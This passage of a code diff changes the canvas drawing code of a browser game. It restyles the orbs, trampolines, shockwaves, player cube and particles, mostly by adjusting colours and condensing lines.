+            ctx.fillStyle = '#50E6FF';
+            ctx.fillRect(obs.x + obs.w / 2 - 3, obs.y + obs.h / 2 - 3, 6, 6);
+          } 
+          // 5. Jump Orbs (Pulsing Rings & Glow)
           else if (obs.type === 'orb') {
             ctx.save();
-            let baseColor = '#FFB900', outerColor = 'rgba(255, 185, 0, 0.6)';
-            if (obs.orbType === 'pink') {
-              baseColor = '#FF007F';
-              outerColor = 'rgba(255, 0, 127, 0.6)';
-            } else if (obs.orbType === 'red') {
-              baseColor = '#E81123';
-              outerColor = 'rgba(232, 17, 35, 0.6)';
-            }
+            let baseColor = '#FFB900', outerColor = 'rgba(255, 185, 0, 0.7)';
+            if (obs.orbType === 'pink') { baseColor = '#FF007F'; outerColor = 'rgba(255, 0, 127, 0.7)'; }
+            else if (obs.orbType === 'red') { baseColor = '#E81123'; outerColor = 'rgba(232, 17, 35, 0.7)'; }
 
-            const pulse = Math.sin(frame * 0.15) * 3;
-            ctx.strokeStyle = obs.used ? 'rgba(200,200,200,0.2)' : outerColor;
-            ctx.lineWidth = 2;
-            ctx.beginPath();
-            ctx.arc(obs.x, obs.y, obs.r + 6 + pulse, 0, Math.PI * 2);
-            ctx.stroke();
+            const pulse = Math.sin(frame * 0.15) * 3.5;
+            ctx.strokeStyle = obs.used ? 'rgba(150,150,150,0.3)' : outerColor; ctx.lineWidth = 2.5;
+            ctx.beginPath(); ctx.arc(obs.x, obs.y, obs.r + 6 + pulse, 0, Math.PI * 2); ctx.stroke();
 
-            ctx.fillStyle = obs.used ? 'rgba(200,200,200,0.25)' : baseColor;
-            ctx.beginPath();
-            ctx.arc(obs.x, obs.y, obs.r, 0, Math.PI * 2);
-            ctx.fill();
+            ctx.fillStyle = obs.used ? 'rgba(100,100,100,0.3)' : baseColor;
+            ctx.beginPath(); ctx.arc(obs.x, obs.y, obs.r, 0, Math.PI * 2); ctx.fill();
+            ctx.strokeStyle = '#000000'; ctx.lineWidth = 1.5; ctx.stroke();
 
             ctx.fillStyle = '#ffffff';
-            ctx.beginPath();
-            ctx.arc(obs.x, obs.y, 5, 0, Math.PI * 2);
-            ctx.fill();
+            ctx.beginPath(); ctx.arc(obs.x, obs.y, 5, 0, Math.PI * 2); ctx.fill();
             ctx.restore();
-          }
+          } 
+          // 6. Trampolines (Safe Rounded Springs)
           else if (obs.type === 'pad') {
             ctx.save();
-            const compress = obs.bounce ? Math.sin(obs.bounce * 0.5) * 3 : 0;
-            const padH = Math.max(4, obs.h - compress);
-            const padY = obs.y + (obs.h - padH);
+            const compress = obs.bounce ? Math.sin(obs.bounce * 0.5) * 3 : 0, padH = Math.max(4, obs.h - compress), padY = obs.y + (obs.h - padH);
+            
+            // Base Bar
+            ctx.fillStyle = '#1E1E1E';
+            ctx.fillRect(obs.x, obs.y + obs.h - 4, obs.w, 4);
 
-            ctx.fillStyle = '#323130';
-            ctx.fillRect(obs.x, obs.y + obs.h - 3, obs.w, 3);
-
+            // Trampoline Top
             ctx.fillStyle = '#FFB900';
-            ctx.beginPath();
-            ctx.roundRect(obs.x + 2, padY, obs.w - 4, padH, [4, 4, 1, 1]);
+            drawSafeRoundRect(ctx, obs.x + 2, padY, obs.w - 4, padH, 3);
             ctx.fill();
-            ctx.strokeStyle = '#E0A800';
-            ctx.lineWidth = 2;
-            ctx.stroke();
+            ctx.strokeStyle = '#E0A800'; ctx.lineWidth = 2; ctx.stroke();
 
+            // White Up Arrow Indicator
             ctx.strokeStyle = '#ffffff';
             ctx.lineWidth = 2;
             ctx.beginPath();
@@ -1413,20 +1366,22 @@
 
         // Shockwaves
         ringPulses.forEach(r => {
-          ctx.strokeStyle = r.color || `rgba(255, 185, 0, ${r.alpha})`;
-          ctx.lineWidth = 3;
-          ctx.beginPath();
-          ctx.arc(r.x, r.y, r.r, 0, Math.PI * 2);
-          ctx.stroke();
+          ctx.strokeStyle = r.color || `rgba(255, 185, 0, ${r.alpha})`; ctx.lineWidth = 3;
+          ctx.beginPath(); ctx.arc(r.x, r.y, r.r, 0, Math.PI * 2); ctx.stroke();
         });
 
-        // Player Cube
+        // Player Cube (Crisp Borders & Quadrants)
         if (!gameOver) {
           ctx.save();
           ctx.translate(landX + cubeSize / 2, cube.y + cubeSize / 2);
           ctx.rotate(cube.angle);
-          const half = cubeSize / 2;
-          const gap = 1;
+          const half = cubeSize / 2, gap = 1;
+
+          // Black Cube Border
+          ctx.fillStyle = '#000000';
+          ctx.fillRect(-half - 2, -half - 2, cubeSize + 4, cubeSize + 4);
+
+          // 4 Microsoft Quadrants
           ctx.fillStyle = msColors[0]; ctx.fillRect(-half, -half, half - gap, half - gap);
           ctx.fillStyle = msColors[1]; ctx.fillRect(gap, -half, half - gap, half - gap);
           ctx.fillStyle = msColors[2]; ctx.fillRect(-half, gap, half - gap, half - gap);
@@ -1436,13 +1391,8 @@
 
         // Death Particles
         particles.forEach(p => {
-          ctx.save();
-          ctx.translate(p.x, p.y);
-          ctx.rotate(p.rot);
-          ctx.fillStyle = p.color;
-          ctx.globalAlpha = Math.max(0, p.alpha);
-          ctx.fillRect(-p.size / 2, -p.size / 2, p.size, p.size);
-          ctx.restore();
+          ctx.save(); ctx.translate(p.x, p.y); ctx.rotate(p.rot); ctx.fillStyle = p.color; ctx.globalAlpha = Math.max(0, p.alpha);
+          ctx.fillRect(-p.size / 2, -p.size / 2, p.size, p.size); ctx.restore();
         });
 
         ctx.restore();
@@ -1453,4 +1403,4 @@
     }
   </script>
 </body>
- </html>
+</html>
